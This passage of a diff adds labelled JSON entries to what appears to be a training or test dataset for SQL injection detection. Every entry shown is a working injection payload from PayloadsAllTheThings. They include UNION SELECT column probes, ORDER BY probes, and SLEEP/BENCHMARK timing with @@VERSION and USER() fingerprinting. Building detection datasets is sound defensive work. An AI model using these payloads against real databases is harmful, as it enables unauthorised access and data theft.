+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),3",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),4",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),\"'3",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),\"'3'\"#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),4#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "text": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#",
+    "label": "attack",
+    "category": "pat-Generic_UnionSelect",
+    "source": "PayloadsAllTheThings"
+  },
+  {
